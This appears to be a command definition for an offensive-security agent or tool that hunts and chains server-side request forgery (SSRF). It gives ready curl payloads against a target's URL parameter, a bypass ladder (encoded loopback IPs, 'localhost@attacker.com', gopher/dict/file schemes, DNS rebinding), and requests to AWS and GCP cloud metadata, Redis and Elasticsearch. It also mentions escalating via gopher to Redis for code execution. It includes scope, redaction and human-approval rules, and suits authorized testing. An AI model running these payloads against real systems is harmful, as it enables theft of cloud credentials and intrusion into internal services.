---
description: SSRF hunt with filter bypass + cloud metadata chain + blind OOB confirmation. Usage: ssrf-chain <target-url> --param url --payload http://<oob>/
---

# /ssrf-chain

Find and confirm SSRF, then chain to internal/cloud metadata.

## Run This

```bash
# Start an OOB listener for blind confirmation:
python tools/oob_listener.py --start

# Baseline: fetch your own callback via the sink:
python tools/deser_probe.py <target-url> --param "url=http://<your-callback>/"    # or direct curl
curl -s "<target-url>?url=http://<your-callback>/"

# Bypass ladder (try in order): redirects, DNS rebinding (rbndr.us), IP tricks (2130706433, 0177.0.0.1, 127.1, [::ffff:127.0.0.1]), hostname tricks (localhost@attacker.com), protocols (gopher://, dict://, file://), double-encoding
# Cloud metadata (if in scope):
curl -s "<target-url>?url=http://169.254.169.254/latest/meta-data/"       # AWS
curl -s "<target-url>?url=http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"  # GCP
# Internal services:
curl -s "<target-url>?url=http://127.0.0.1:6379/"                          # Redis
curl -s "<target-url>?url=http://127.0.0.1:9200/_cat/indices"              # Elasticsearch
```

## Workflow

1. Identify sink (URL fetch params) + baseline with own OOB endpoint → hit = CONFIRMED.
2. If blocked, ladder the bypasses (above) until one passes.
3. Escalate: metadata (redact creds!), internal HTTP, internal services, gopher→Redis RCE (human approval).
4. Blind SSRF: OOB callback = CONFIRMED → then chain.

## Rules

- Callbacks only to your own interactsh endpoint.
- Redact credentials; never dump secrets.
- No internal service exploitation without human approval + in-scope.

## Output

`findings/<target>/ssrf-<date>.md`: sink, bypass used, target reached, callback evidence.
